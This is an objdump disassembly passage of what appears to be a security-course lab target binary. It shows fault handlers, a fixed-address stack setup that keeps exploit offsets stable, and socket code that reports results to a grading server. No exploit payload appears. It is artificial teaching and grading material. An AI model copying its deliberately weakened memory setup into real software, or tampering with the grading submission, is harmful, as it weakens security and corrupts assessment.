  401d60:	bf 95 31 40 00       	mov    $0x403195,%edi
  401d65:	e8 e6 ee ff ff       	callq  400c50 <puts@plt>
  401d6a:	b8 00 00 00 00       	mov    $0x0,%eax
  401d6f:	e8 e7 fc ff ff       	callq  401a5b <check_fail>
  401d74:	bf 00 33 40 00       	mov    $0x403300,%edi
  401d79:	e8 d2 ee ff ff       	callq  400c50 <puts@plt>
  401d7e:	bf 9f 31 40 00       	mov    $0x40319f,%edi
  401d83:	e8 c8 ee ff ff       	callq  400c50 <puts@plt>
  401d88:	be 00 00 00 00       	mov    $0x0,%esi
  401d8d:	bf 00 00 00 00       	mov    $0x0,%edi
  401d92:	e8 45 fd ff ff       	callq  401adc <notify_server>
  401d97:	bf 01 00 00 00       	mov    $0x1,%edi
  401d9c:	e8 4f f0 ff ff       	callq  400df0 <exit@plt>

0000000000401da1 <seghandler>:
  401da1:	48 83 ec 08          	sub    $0x8,%rsp
  401da5:	83 3d 5c 27 20 00 00 	cmpl   $0x0,0x20275c(%rip)        # 604508 <is_checker>
  401dac:	74 14                	je     401dc2 <seghandler+0x21>
  401dae:	bf b5 31 40 00       	mov    $0x4031b5,%edi
  401db3:	e8 98 ee ff ff       	callq  400c50 <puts@plt>
  401db8:	b8 00 00 00 00       	mov    $0x0,%eax
  401dbd:	e8 99 fc ff ff       	callq  401a5b <check_fail>
  401dc2:	bf 20 33 40 00       	mov    $0x403320,%edi
  401dc7:	e8 84 ee ff ff       	callq  400c50 <puts@plt>
  401dcc:	bf 9f 31 40 00       	mov    $0x40319f,%edi
  401dd1:	e8 7a ee ff ff       	callq  400c50 <puts@plt>
  401dd6:	be 00 00 00 00       	mov    $0x0,%esi
  401ddb:	bf 00 00 00 00       	mov    $0x0,%edi
  401de0:	e8 f7 fc ff ff       	callq  401adc <notify_server>
  401de5:	bf 01 00 00 00       	mov    $0x1,%edi
  401dea:	e8 01 f0 ff ff       	callq  400df0 <exit@plt>

0000000000401def <illegalhandler>:
  401def:	48 83 ec 08          	sub    $0x8,%rsp
  401df3:	83 3d 0e 27 20 00 00 	cmpl   $0x0,0x20270e(%rip)        # 604508 <is_checker>
  401dfa:	74 14                	je     401e10 <illegalhandler+0x21>
  401dfc:	bf c8 31 40 00       	mov    $0x4031c8,%edi
  401e01:	e8 4a ee ff ff       	callq  400c50 <puts@plt>
  401e06:	b8 00 00 00 00       	mov    $0x0,%eax
  401e0b:	e8 4b fc ff ff       	callq  401a5b <check_fail>
  401e10:	bf 48 33 40 00       	mov    $0x403348,%edi
  401e15:	e8 36 ee ff ff       	callq  400c50 <puts@plt>
  401e1a:	bf 9f 31 40 00       	mov    $0x40319f,%edi
  401e1f:	e8 2c ee ff ff       	callq  400c50 <puts@plt>
  401e24:	be 00 00 00 00       	mov    $0x0,%esi
  401e29:	bf 00 00 00 00       	mov    $0x0,%edi
  401e2e:	e8 a9 fc ff ff       	callq  401adc <notify_server>
  401e33:	bf 01 00 00 00       	mov    $0x1,%edi
  401e38:	e8 b3 ef ff ff       	callq  400df0 <exit@plt>

0000000000401e3d <sigalrmhandler>:
  401e3d:	48 83 ec 08          	sub    $0x8,%rsp
  401e41:	83 3d c0 26 20 00 00 	cmpl   $0x0,0x2026c0(%rip)        # 604508 <is_checker>
  401e48:	74 14                	je     401e5e <sigalrmhandler+0x21>
  401e4a:	bf dc 31 40 00       	mov    $0x4031dc,%edi
  401e4f:	e8 fc ed ff ff       	callq  400c50 <puts@plt>
  401e54:	b8 00 00 00 00       	mov    $0x0,%eax
  401e59:	e8 fd fb ff ff       	callq  401a5b <check_fail>
  401e5e:	be 05 00 00 00       	mov    $0x5,%esi
  401e63:	bf 78 33 40 00       	mov    $0x403378,%edi
  401e68:	b8 00 00 00 00       	mov    $0x0,%eax
  401e6d:	e8 0e ee ff ff       	callq  400c80 <printf@plt>
  401e72:	be 00 00 00 00       	mov    $0x0,%esi
  401e77:	bf 00 00 00 00       	mov    $0x0,%edi
  401e7c:	e8 5b fc ff ff       	callq  401adc <notify_server>
  401e81:	bf 01 00 00 00       	mov    $0x1,%edi
  401e86:	e8 65 ef ff ff       	callq  400df0 <exit@plt>

0000000000401e8b <launch>:
  401e8b:	55                   	push   %rbp
  401e8c:	48 89 e5             	mov    %rsp,%rbp
  401e8f:	48 89 fa             	mov    %rdi,%rdx
  401e92:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
  401e96:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401e9a:	48 29 c4             	sub    %rax,%rsp
  401e9d:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
  401ea2:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
  401ea6:	be f4 00 00 00       	mov    $0xf4,%esi
  401eab:	e8 e0 ed ff ff       	callq  400c90 <memset@plt>
  401eb0:	48 8b 05 09 26 20 00 	mov    0x202609(%rip),%rax        # 6044c0 <stdin@@GLIBC_2.2.5>
  401eb7:	48 39 05 32 26 20 00 	cmp    %rax,0x202632(%rip)        # 6044f0 <infile>
  401ebe:	75 0f                	jne    401ecf <launch+0x44>
  401ec0:	bf e4 31 40 00       	mov    $0x4031e4,%edi
  401ec5:	b8 00 00 00 00       	mov    $0x0,%eax
  401eca:	e8 b1 ed ff ff       	callq  400c80 <printf@plt>
  401ecf:	c7 05 23 26 20 00 00 	movl   $0x0,0x202623(%rip)        # 6044fc <vlevel>
  401ed6:	00 00 00 
  401ed9:	b8 00 00 00 00       	mov    $0x0,%eax
  401ede:	e8 df fa ff ff       	callq  4019c2 <test>
  401ee3:	83 3d 1e 26 20 00 00 	cmpl   $0x0,0x20261e(%rip)        # 604508 <is_checker>
  401eea:	74 14                	je     401f00 <launch+0x75>
  401eec:	bf f1 31 40 00       	mov    $0x4031f1,%edi
  401ef1:	e8 5a ed ff ff       	callq  400c50 <puts@plt>
  401ef6:	b8 00 00 00 00       	mov    $0x0,%eax
  401efb:	e8 5b fb ff ff       	callq  401a5b <check_fail>
  401f00:	bf fc 31 40 00       	mov    $0x4031fc,%edi
  401f05:	e8 46 ed ff ff       	callq  400c50 <puts@plt>
  401f0a:	c9                   	leaveq 
  401f0b:	c3                   	retq   

0000000000401f0c <stable_launch>:
  401f0c:	53                   	push   %rbx
  401f0d:	48 89 3d d4 25 20 00 	mov    %rdi,0x2025d4(%rip)        # 6044e8 <global_offset>
  401f14:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  401f1a:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  401f20:	b9 32 01 00 00       	mov    $0x132,%ecx
  401f25:	ba 07 00 00 00       	mov    $0x7,%edx
  401f2a:	be 00 00 10 00       	mov    $0x100000,%esi
  401f2f:	bf 00 60 58 55       	mov    $0x55586000,%edi
  401f34:	e8 37 ed ff ff       	callq  400c70 <mmap@plt>
  401f39:	48 89 c3             	mov    %rax,%rbx
  401f3c:	48 3d 00 60 58 55    	cmp    $0x55586000,%rax
  401f42:	74 32                	je     401f76 <stable_launch+0x6a>
  401f44:	be 00 00 10 00       	mov    $0x100000,%esi
  401f49:	48 89 c7             	mov    %rax,%rdi
  401f4c:	e8 2f ee ff ff       	callq  400d80 <munmap@plt>
  401f51:	ba 00 60 58 55       	mov    $0x55586000,%edx
  401f56:	be b0 33 40 00       	mov    $0x4033b0,%esi
  401f5b:	48 8b 3d 6e 25 20 00 	mov    0x20256e(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  401f62:	b8 00 00 00 00       	mov    $0x0,%eax
  401f67:	e8 94 ed ff ff       	callq  400d00 <fprintf@plt>
  401f6c:	bf 01 00 00 00       	mov    $0x1,%edi
  401f71:	e8 7a ee ff ff       	callq  400df0 <exit@plt>
  401f76:	48 8d 90 f8 ff 0f 00 	lea    0xffff8(%rax),%rdx
  401f7d:	48 89 15 ac 31 20 00 	mov    %rdx,0x2031ac(%rip)        # 605130 <stack_top>
  401f84:	48 89 e0             	mov    %rsp,%rax
  401f87:	48 89 d4             	mov    %rdx,%rsp
  401f8a:	48 89 c2             	mov    %rax,%rdx
  401f8d:	48 89 15 4c 25 20 00 	mov    %rdx,0x20254c(%rip)        # 6044e0 <global_save_stack>
  401f94:	48 8b 3d 4d 25 20 00 	mov    0x20254d(%rip),%rdi        # 6044e8 <global_offset>
  401f9b:	e8 eb fe ff ff       	callq  401e8b <launch>
  401fa0:	48 8b 05 39 25 20 00 	mov    0x202539(%rip),%rax        # 6044e0 <global_save_stack>
  401fa7:	48 89 c4             	mov    %rax,%rsp
  401faa:	be 00 00 10 00       	mov    $0x100000,%esi
  401faf:	48 89 df             	mov    %rbx,%rdi
  401fb2:	e8 c9 ed ff ff       	callq  400d80 <munmap@plt>
  401fb7:	5b                   	pop    %rbx
  401fb8:	c3                   	retq   
  401fb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401fc0 <rio_readinitb>:
  401fc0:	89 37                	mov    %esi,(%rdi)
  401fc2:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%rdi)
  401fc9:	48 8d 47 10          	lea    0x10(%rdi),%rax
  401fcd:	48 89 47 08          	mov    %rax,0x8(%rdi)
  401fd1:	c3                   	retq   

0000000000401fd2 <sigalrm_handler>:
  401fd2:	48 83 ec 08          	sub    $0x8,%rsp
  401fd6:	ba 00 00 00 00       	mov    $0x0,%edx
  401fdb:	be f0 33 40 00       	mov    $0x4033f0,%esi
  401fe0:	48 8b 3d e9 24 20 00 	mov    0x2024e9(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  401fe7:	b8 00 00 00 00       	mov    $0x0,%eax
  401fec:	e8 0f ed ff ff       	callq  400d00 <fprintf@plt>
  401ff1:	bf 01 00 00 00       	mov    $0x1,%edi
  401ff6:	e8 f5 ed ff ff       	callq  400df0 <exit@plt>

0000000000401ffb <urlencode>:
  401ffb:	41 54                	push   %r12
  401ffd:	55                   	push   %rbp
  401ffe:	53                   	push   %rbx
  401fff:	48 83 ec 10          	sub    $0x10,%rsp
  402003:	48 89 fb             	mov    %rdi,%rbx
  402006:	48 89 f5             	mov    %rsi,%rbp
  402009:	b8 00 00 00 00       	mov    $0x0,%eax
  40200e:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  402015:	f2 ae                	repnz scas %es:(%rdi),%al
  402017:	48 f7 d1             	not    %rcx
  40201a:	8d 41 ff             	lea    -0x1(%rcx),%eax
  40201d:	e9 93 00 00 00       	jmpq   4020b5 <urlencode+0xba>
  402022:	0f b6 13             	movzbl (%rbx),%edx
  402025:	80 fa 2a             	cmp    $0x2a,%dl
  402028:	0f 94 c1             	sete   %cl
  40202b:	80 fa 2d             	cmp    $0x2d,%dl
  40202e:	0f 94 c0             	sete   %al
  402031:	08 c1                	or     %al,%cl
  402033:	75 1f                	jne    402054 <urlencode+0x59>
  402035:	80 fa 2e             	cmp    $0x2e,%dl
  402038:	74 1a                	je     402054 <urlencode+0x59>
  40203a:	80 fa 5f             	cmp    $0x5f,%dl
  40203d:	74 15                	je     402054 <urlencode+0x59>
  40203f:	8d 42 d0             	lea    -0x30(%rdx),%eax
  402042:	3c 09                	cmp    $0x9,%al
  402044:	76 0e                	jbe    402054 <urlencode+0x59>
  402046:	8d 42 bf             	lea    -0x41(%rdx),%eax
  402049:	3c 19                	cmp    $0x19,%al
  40204b:	76 07                	jbe    402054 <urlencode+0x59>
  40204d:	8d 42 9f             	lea    -0x61(%rdx),%eax
  402050:	3c 19                	cmp    $0x19,%al
  402052:	77 09                	ja     40205d <urlencode+0x62>
  402054:	88 55 00             	mov    %dl,0x0(%rbp)
  402057:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  40205b:	eb 51                	jmp    4020ae <urlencode+0xb3>
  40205d:	80 fa 20             	cmp    $0x20,%dl
  402060:	75 0a                	jne    40206c <urlencode+0x71>
  402062:	c6 45 00 2b          	movb   $0x2b,0x0(%rbp)
  402066:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  40206a:	eb 42                	jmp    4020ae <urlencode+0xb3>
  40206c:	8d 42 e0             	lea    -0x20(%rdx),%eax
  40206f:	3c 5f                	cmp    $0x5f,%al
  402071:	0f 96 c1             	setbe  %cl
  402074:	80 fa 09             	cmp    $0x9,%dl
  402077:	0f 94 c0             	sete   %al
  40207a:	08 c1                	or     %al,%cl
  40207c:	74 45                	je     4020c3 <urlencode+0xc8>
  40207e:	0f b6 d2             	movzbl %dl,%edx
  402081:	be 88 34 40 00       	mov    $0x403488,%esi
  402086:	48 89 e7             	mov    %rsp,%rdi
  402089:	b8 00 00 00 00       	mov    $0x0,%eax
  40208e:	e8 4d ed ff ff       	callq  400de0 <sprintf@plt>
  402093:	0f b6 04 24          	movzbl (%rsp),%eax
  402097:	88 45 00             	mov    %al,0x0(%rbp)
  40209a:	0f b6 44 24 01       	movzbl 0x1(%rsp),%eax
  40209f:	88 45 01             	mov    %al,0x1(%rbp)
  4020a2:	0f b6 44 24 02       	movzbl 0x2(%rsp),%eax
  4020a7:	88 45 02             	mov    %al,0x2(%rbp)
  4020aa:	48 8d 6d 03          	lea    0x3(%rbp),%rbp
  4020ae:	48 83 c3 01          	add    $0x1,%rbx
  4020b2:	44 89 e0             	mov    %r12d,%eax
  4020b5:	44 8d 60 ff          	lea    -0x1(%rax),%r12d
  4020b9:	85 c0                	test   %eax,%eax
  4020bb:	0f 85 61 ff ff ff    	jne    402022 <urlencode+0x27>
  4020c1:	eb 05                	jmp    4020c8 <urlencode+0xcd>
  4020c3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4020c8:	48 83 c4 10          	add    $0x10,%rsp
  4020cc:	5b                   	pop    %rbx
  4020cd:	5d                   	pop    %rbp
  4020ce:	41 5c                	pop    %r12
  4020d0:	c3                   	retq   

00000000004020d1 <rio_writen>:
  4020d1:	41 55                	push   %r13
  4020d3:	41 54                	push   %r12
  4020d5:	55                   	push   %rbp
  4020d6:	53                   	push   %rbx
  4020d7:	48 83 ec 08          	sub    $0x8,%rsp
  4020db:	41 89 fc             	mov    %edi,%r12d
  4020de:	48 89 f5             	mov    %rsi,%rbp
  4020e1:	49 89 d5             	mov    %rdx,%r13
  4020e4:	48 89 d3             	mov    %rdx,%rbx
  4020e7:	eb 28                	jmp    402111 <rio_writen+0x40>
  4020e9:	48 89 da             	mov    %rbx,%rdx
  4020ec:	48 89 ee             	mov    %rbp,%rsi
  4020ef:	44 89 e7             	mov    %r12d,%edi
  4020f2:	e8 69 eb ff ff       	callq  400c60 <write@plt>
  4020f7:	48 85 c0             	test   %rax,%rax
  4020fa:	7f 0f                	jg     40210b <rio_writen+0x3a>
  4020fc:	e8 0f eb ff ff       	callq  400c10 <__errno_location@plt>
  402101:	83 38 04             	cmpl   $0x4,(%rax)
  402104:	75 15                	jne    40211b <rio_writen+0x4a>
  402106:	b8 00 00 00 00       	mov    $0x0,%eax
  40210b:	48 29 c3             	sub    %rax,%rbx
  40210e:	48 01 c5             	add    %rax,%rbp
  402111:	48 85 db             	test   %rbx,%rbx
  402114:	75 d3                	jne    4020e9 <rio_writen+0x18>
  402116:	4c 89 e8             	mov    %r13,%rax
  402119:	eb 07                	jmp    402122 <rio_writen+0x51>
  40211b:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  402122:	48 83 c4 08          	add    $0x8,%rsp
  402126:	5b                   	pop    %rbx
  402127:	5d                   	pop    %rbp
  402128:	41 5c                	pop    %r12
  40212a:	41 5d                	pop    %r13
  40212c:	c3                   	retq   

000000000040212d <rio_read>:
  40212d:	41 56                	push   %r14
  40212f:	41 55                	push   %r13
  402131:	41 54                	push   %r12
  402133:	55                   	push   %rbp
  402134:	53                   	push   %rbx
  402135:	48 89 fb             	mov    %rdi,%rbx
  402138:	49 89 f6             	mov    %rsi,%r14
  40213b:	49 89 d5             	mov    %rdx,%r13
  40213e:	4c 8d 67 10          	lea    0x10(%rdi),%r12
  402142:	eb 2a                	jmp    40216e <rio_read+0x41>
  402144:	ba 00 20 00 00       	mov    $0x2000,%edx
  402149:	4c 89 e6             	mov    %r12,%rsi
  40214c:	8b 3b                	mov    (%rbx),%edi
  40214e:	e8 6d eb ff ff       	callq  400cc0 <read@plt>
  402153:	89 43 04             	mov    %eax,0x4(%rbx)
  402156:	85 c0                	test   %eax,%eax
  402158:	79 0c                	jns    402166 <rio_read+0x39>
  40215a:	e8 b1 ea ff ff       	callq  400c10 <__errno_location@plt>
  40215f:	83 38 04             	cmpl   $0x4,(%rax)
  402162:	74 0a                	je     40216e <rio_read+0x41>
  402164:	eb 37                	jmp    40219d <rio_read+0x70>
  402166:	85 c0                	test   %eax,%eax
  402168:	74 3c                	je     4021a6 <rio_read+0x79>
  40216a:	4c 89 63 08          	mov    %r12,0x8(%rbx)
  40216e:	8b 6b 04             	mov    0x4(%rbx),%ebp
  402171:	85 ed                	test   %ebp,%ebp
  402173:	7e cf                	jle    402144 <rio_read+0x17>
  402175:	89 e8                	mov    %ebp,%eax
  402177:	4c 39 e8             	cmp    %r13,%rax
  40217a:	72 03                	jb     40217f <rio_read+0x52>
  40217c:	44 89 ed             	mov    %r13d,%ebp
  40217f:	4c 63 e5             	movslq %ebp,%r12
  402182:	48 8b 73 08          	mov    0x8(%rbx),%rsi
  402186:	4c 89 e2             	mov    %r12,%rdx
  402189:	4c 89 f7             	mov    %r14,%rdi
  40218c:	e8 9f eb ff ff       	callq  400d30 <memcpy@plt>
  402191:	4c 01 63 08          	add    %r12,0x8(%rbx)
  402195:	29 6b 04             	sub    %ebp,0x4(%rbx)
  402198:	4c 89 e0             	mov    %r12,%rax
  40219b:	eb 0e                	jmp    4021ab <rio_read+0x7e>
  40219d:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  4021a4:	eb 05                	jmp    4021ab <rio_read+0x7e>
  4021a6:	b8 00 00 00 00       	mov    $0x0,%eax
  4021ab:	5b                   	pop    %rbx
  4021ac:	5d                   	pop    %rbp
  4021ad:	41 5c                	pop    %r12
  4021af:	41 5d                	pop    %r13
  4021b1:	41 5e                	pop    %r14
  4021b3:	c3                   	retq   

00000000004021b4 <rio_readlineb>:
  4021b4:	41 55                	push   %r13
  4021b6:	41 54                	push   %r12
  4021b8:	55                   	push   %rbp
  4021b9:	53                   	push   %rbx
  4021ba:	48 83 ec 18          	sub    $0x18,%rsp
  4021be:	49 89 fd             	mov    %rdi,%r13
  4021c1:	48 89 f5             	mov    %rsi,%rbp
  4021c4:	49 89 d4             	mov    %rdx,%r12
  4021c7:	bb 01 00 00 00       	mov    $0x1,%ebx
  4021cc:	eb 3d                	jmp    40220b <rio_readlineb+0x57>
  4021ce:	ba 01 00 00 00       	mov    $0x1,%edx
  4021d3:	48 8d 74 24 0f       	lea    0xf(%rsp),%rsi
  4021d8:	4c 89 ef             	mov    %r13,%rdi
  4021db:	e8 4d ff ff ff       	callq  40212d <rio_read>
  4021e0:	83 f8 01             	cmp    $0x1,%eax
  4021e3:	75 12                	jne    4021f7 <rio_readlineb+0x43>
  4021e5:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  4021e9:	0f b6 44 24 0f       	movzbl 0xf(%rsp),%eax
  4021ee:	88 45 00             	mov    %al,0x0(%rbp)
  4021f1:	3c 0a                	cmp    $0xa,%al
  4021f3:	75 0f                	jne    402204 <rio_readlineb+0x50>
  4021f5:	eb 1b                	jmp    402212 <rio_readlineb+0x5e>
  4021f7:	85 c0                	test   %eax,%eax
  4021f9:	75 23                	jne    40221e <rio_readlineb+0x6a>
  4021fb:	48 83 fb 01          	cmp    $0x1,%rbx
  4021ff:	90                   	nop
  402200:	75 13                	jne    402215 <rio_readlineb+0x61>
  402202:	eb 23                	jmp    402227 <rio_readlineb+0x73>
  402204:	48 83 c3 01          	add    $0x1,%rbx
  402208:	48 89 d5             	mov    %rdx,%rbp
  40220b:	4c 39 e3             	cmp    %r12,%rbx
  40220e:	72 be                	jb     4021ce <rio_readlineb+0x1a>
  402210:	eb 03                	jmp    402215 <rio_readlineb+0x61>
  402212:	48 89 d5             	mov    %rdx,%rbp
  402215:	c6 45 00 00          	movb   $0x0,0x0(%rbp)
  402219:	48 89 d8             	mov    %rbx,%rax
  40221c:	eb 0e                	jmp    40222c <rio_readlineb+0x78>
  40221e:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  402225:	eb 05                	jmp    40222c <rio_readlineb+0x78>
  402227:	b8 00 00 00 00       	mov    $0x0,%eax
  40222c:	48 83 c4 18          	add    $0x18,%rsp
  402230:	5b                   	pop    %rbx
  402231:	5d                   	pop    %rbp
  402232:	41 5c                	pop    %r12
  402234:	41 5d                	pop    %r13
  402236:	c3                   	retq   

0000000000402237 <submitr>:
  402237:	41 57                	push   %r15
  402239:	41 56                	push   %r14
  40223b:	41 55                	push   %r13
  40223d:	41 54                	push   %r12
  40223f:	55                   	push   %rbp
  402240:	53                   	push   %rbx
  402241:	48 81 ec 48 a0 00 00 	sub    $0xa048,%rsp
  402248:	49 89 fc             	mov    %rdi,%r12
  40224b:	89 74 24 04          	mov    %esi,0x4(%rsp)
  40224f:	49 89 d7             	mov    %rdx,%r15
  402252:	49 89 ce             	mov    %rcx,%r14
  402255:	4c 89 44 24 08       	mov    %r8,0x8(%rsp)
  40225a:	4d 89 cd             	mov    %r9,%r13
  40225d:	48 8b 9c 24 80 a0 00 	mov    0xa080(%rsp),%rbx
  402264:	00 
  402265:	c7 84 24 1c 20 00 00 	movl   $0x0,0x201c(%rsp)
  40226c:	00 00 00 00 
  402270:	ba 00 00 00 00       	mov    $0x0,%edx
  402275:	be 01 00 00 00       	mov    $0x1,%esi
  40227a:	bf 02 00 00 00       	mov    $0x2,%edi
  40227f:	e8 8c eb ff ff       	callq  400e10 <socket@plt>
  402284:	89 c5                	mov    %eax,%ebp
  402286:	85 c0                	test   %eax,%eax
  402288:	79 4e                	jns    4022d8 <submitr+0xa1>
  40228a:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402291:	3a 20 43 
  402294:	48 89 03             	mov    %rax,(%rbx)
  402297:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  40229e:	20 75 6e 
  4022a1:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4022a5:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4022ac:	74 6f 20 
  4022af:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4022b3:	48 b8 63 72 65 61 74 	movabs $0x7320657461657263,%rax
  4022ba:	65 20 73 
  4022bd:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4022c1:	c7 43 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbx)
  4022c8:	66 c7 43 24 74 00    	movw   $0x74,0x24(%rbx)
  4022ce:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4022d3:	e9 68 06 00 00       	jmpq   402940 <submitr+0x709>
  4022d8:	4c 89 e7             	mov    %r12,%rdi
  4022db:	e8 10 ea ff ff       	callq  400cf0 <gethostbyname@plt>
  4022e0:	48 85 c0             	test   %rax,%rax
  4022e3:	75 67                	jne    40234c <submitr+0x115>
  4022e5:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  4022ec:	3a 20 44 
  4022ef:	48 89 03             	mov    %rax,(%rbx)
  4022f2:	48 b8 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rax
  4022f9:	20 75 6e 
  4022fc:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402300:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402307:	74 6f 20 
  40230a:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40230e:	48 b8 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rax
  402315:	76 65 20 
  402318:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40231c:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402323:	72 20 61 
  402326:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40232a:	c7 43 28 64 64 72 65 	movl   $0x65726464,0x28(%rbx)
  402331:	66 c7 43 2c 73 73    	movw   $0x7373,0x2c(%rbx)
  402337:	c6 43 2e 00          	movb   $0x0,0x2e(%rbx)
  40233b:	89 ef                	mov    %ebp,%edi
  40233d:	e8 6e e9 ff ff       	callq  400cb0 <close@plt>
  402342:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402347:	e9 f4 05 00 00       	jmpq   402940 <submitr+0x709>
  40234c:	48 c7 84 24 30 a0 00 	movq   $0x0,0xa030(%rsp)
  402353:	00 00 00 00 00 
  402358:	48 c7 84 24 38 a0 00 	movq   $0x0,0xa038(%rsp)
  40235f:	00 00 00 00 00 
  402364:	66 c7 84 24 30 a0 00 	movw   $0x2,0xa030(%rsp)
  40236b:	00 02 00 
  40236e:	48 8b 48 18          	mov    0x18(%rax),%rcx
  402372:	48 63 50 14          	movslq 0x14(%rax),%rdx
  402376:	48 8d b4 24 34 a0 00 	lea    0xa034(%rsp),%rsi
  40237d:	00 
  40237e:	48 8b 39             	mov    (%rcx),%rdi
  402381:	e8 0a ea ff ff       	callq  400d90 <bcopy@plt>
  402386:	0f b7 44 24 04       	movzwl 0x4(%rsp),%eax
  40238b:	66 c1 c8 08          	ror    $0x8,%ax
  40238f:	66 89 84 24 32 a0 00 	mov    %ax,0xa032(%rsp)
  402396:	00 
  402397:	ba 10 00 00 00       	mov    $0x10,%edx
  40239c:	48 8d b4 24 30 a0 00 	lea    0xa030(%rsp),%rsi
  4023a3:	00 
  4023a4:	89 ef                	mov    %ebp,%edi
  4023a6:	e8 55 ea ff ff       	callq  400e00 <connect@plt>
  4023ab:	85 c0                	test   %eax,%eax
  4023ad:	79 59                	jns    402408 <submitr+0x1d1>
  4023af:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  4023b6:	3a 20 55 
  4023b9:	48 89 03             	mov    %rax,(%rbx)
  4023bc:	48 b8 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rax
  4023c3:	20 74 6f 
  4023c6:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4023ca:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  4023d1:	65 63 74 
  4023d4:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4023d8:	48 b8 20 74 6f 20 74 	movabs $0x20656874206f7420,%rax
  4023df:	68 65 20 
  4023e2:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4023e6:	c7 43 20 73 65 72 76 	movl   $0x76726573,0x20(%rbx)
  4023ed:	66 c7 43 24 65 72    	movw   $0x7265,0x24(%rbx)
  4023f3:	c6 43 26 00          	movb   $0x0,0x26(%rbx)
  4023f7:	89 ef                	mov    %ebp,%edi
  4023f9:	e8 b2 e8 ff ff       	callq  400cb0 <close@plt>
  4023fe:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402403:	e9 38 05 00 00       	jmpq   402940 <submitr+0x709>
  402408:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  40240f:	4c 89 ef             	mov    %r13,%rdi
  402412:	b8 00 00 00 00       	mov    $0x0,%eax
  402417:	48 89 d1             	mov    %rdx,%rcx
  40241a:	f2 ae                	repnz scas %es:(%rdi),%al
  40241c:	48 f7 d1             	not    %rcx
  40241f:	48 89 ce             	mov    %rcx,%rsi
  402422:	4c 89 ff             	mov    %r15,%rdi
  402425:	48 89 d1             	mov    %rdx,%rcx
  402428:	f2 ae                	repnz scas %es:(%rdi),%al
  40242a:	48 f7 d1             	not    %rcx
  40242d:	49 89 c8             	mov    %rcx,%r8
  402430:	4c 89 f7             	mov    %r14,%rdi
  402433:	48 89 d1             	mov    %rdx,%rcx
  402436:	f2 ae                	repnz scas %es:(%rdi),%al
  402438:	49 29 c8             	sub    %rcx,%r8
  40243b:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
  402440:	48 89 d1             	mov    %rdx,%rcx
  402443:	f2 ae                	repnz scas %es:(%rdi),%al
  402445:	49 29 c8             	sub    %rcx,%r8
  402448:	48 8d 44 76 fd       	lea    -0x3(%rsi,%rsi,2),%rax
  40244d:	49 8d 44 00 7b       	lea    0x7b(%r8,%rax,1),%rax
  402452:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
  402458:	76 72                	jbe    4024cc <submitr+0x295>
  40245a:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  402461:	3a 20 52 
  402464:	48 89 03             	mov    %rax,(%rbx)
  402467:	48 b8 65 73 75 6c 74 	movabs $0x747320746c757365,%rax
  40246e:	20 73 74 
  402471:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402475:	48 b8 72 69 6e 67 20 	movabs $0x6f6f7420676e6972,%rax
  40247c:	74 6f 6f 
  40247f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402483:	48 b8 20 6c 61 72 67 	movabs $0x202e656772616c20,%rax
  40248a:	65 2e 20 
  40248d:	48 89 43 18          	mov    %rax,0x18(%rbx)
  402491:	48 b8 49 6e 63 72 65 	movabs $0x6573616572636e49,%rax
  402498:	61 73 65 
  40249b:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40249f:	48 b8 20 53 55 42 4d 	movabs $0x5254494d42555320,%rax
  4024a6:	49 54 52 
  4024a9:	48 89 43 28          	mov    %rax,0x28(%rbx)
  4024ad:	48 b8 5f 4d 41 58 42 	movabs $0x46554258414d5f,%rax
  4024b4:	55 46 00 
  4024b7:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4024bb:	89 ef                	mov    %ebp,%edi
  4024bd:	e8 ee e7 ff ff       	callq  400cb0 <close@plt>
  4024c2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
